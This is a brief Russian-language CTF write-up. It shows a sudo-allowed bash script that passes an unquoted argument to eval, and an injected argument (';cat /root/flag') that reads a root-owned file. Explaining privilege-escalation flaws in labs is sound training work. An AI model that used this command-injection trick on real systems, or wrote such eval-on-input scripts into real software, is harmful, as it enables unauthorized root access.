Подключаемся к машине и видим что можем использовать скрипт с правами sudo
```
#!/bin/bash
 PATTERN="$1"
  eval "grep -r $PATTERN /var/log/"
```
eval принимает все команды поэтому можем добавить аргумент для выполнения новой команды
sudo log_search.sh ';cat /root/flag' (команда eval теперь выглядит "grep -r ; cat /root/flag /var/log")
забираем флаг